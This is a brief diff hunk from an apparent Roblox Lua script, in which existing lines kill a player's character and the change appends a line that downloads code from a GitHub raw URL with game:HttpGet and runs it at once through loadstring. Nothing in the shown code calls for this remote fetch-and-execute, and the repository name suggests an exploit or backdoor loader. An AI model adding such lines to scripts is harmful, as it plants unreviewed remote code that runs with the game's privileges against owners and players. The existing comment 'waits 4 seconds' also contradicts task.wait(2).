@@ -257,3 +257,6 @@ task.wait(2) -- waits 4 seconds
 if player and player.Character then
 	player.Character:BreakJoints()
 end
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KieuroBeep/TrixSpoits/refs/heads/main/DiscordServer"))() 
